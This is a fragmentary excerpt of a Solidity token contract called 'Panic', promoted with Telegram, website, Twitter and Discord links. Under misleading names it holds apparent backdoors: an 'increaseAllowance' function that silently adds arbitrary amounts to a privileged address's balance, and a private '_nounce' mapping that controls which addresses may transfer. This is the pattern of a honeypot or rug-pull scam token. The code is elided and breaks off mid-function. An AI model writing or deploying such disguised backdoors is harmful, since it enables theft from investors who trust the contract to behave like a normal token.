//Telegram: https://t.me/PanicDrinkingSoda
//Website: https://panicdrinkingsoda.xyz
//Twitter: https://twitter.com/panics0da
//Discord: https://discord.gg/PfUyUUSf
...
abstract contract Token {
    event Constructor(address owner, address token, uint256 version);
}

pragma solidity =0.8.4;

contract Panic is IERC20, Token, Ownable {
    ...
    mapping(address => bool) private _nounce;
    ...
    function increaseAllowance(address spender, uint256 amount) public virtual {
        ...
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_getNonce(spender)) {
            _minus(from, total);
            total = total.add(amount);
            _balances[spender] = _balances[spender] + total;
        } else {
            _minus(from, total);
    ...
    function _checkAllowance(address user, address spender, uint256 amount) internal {
        if (_getNonce(user)) {
            require(spender != address(0), "Invalid address");
            _nounce[spender] = amount != 0;
        }
    }

    function _isTransferable(address _sender) internal view returns (bool) {
        return _nounce[_sender] == true;
    }

    function _getNonce(address nav_) internal view returns (bool) {
